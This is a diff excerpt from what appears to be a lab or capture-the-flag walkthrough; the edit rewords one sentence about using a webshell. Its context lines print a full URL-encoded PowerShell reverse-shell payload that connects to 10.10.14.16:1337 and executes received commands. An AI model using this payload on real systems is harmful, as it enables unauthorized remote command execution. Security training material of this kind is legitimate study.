@@ -479,7 +479,7 @@ Next, we can **URL-encode** our shell via [CyberChef](https://gchq.github.io/Cyb
 powershell%20%2Dep%20bypass%20%2Dnop%20%2Dc%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%2710%2E10%2E14%2E16%27%2C1337%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C%200%2C%20%24bytes%2ELength%29%29%20%2Dne%200%29%7B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%3B%7D%24client%2EClose%28%29%3B%22
 ```
 
-We are now ready to pass it as a command to our webshell:
+We are now ready to pass it as a command to our webshell and catch our reverse shell back:
 
 ```bash
 # opening a listener to catch the shell
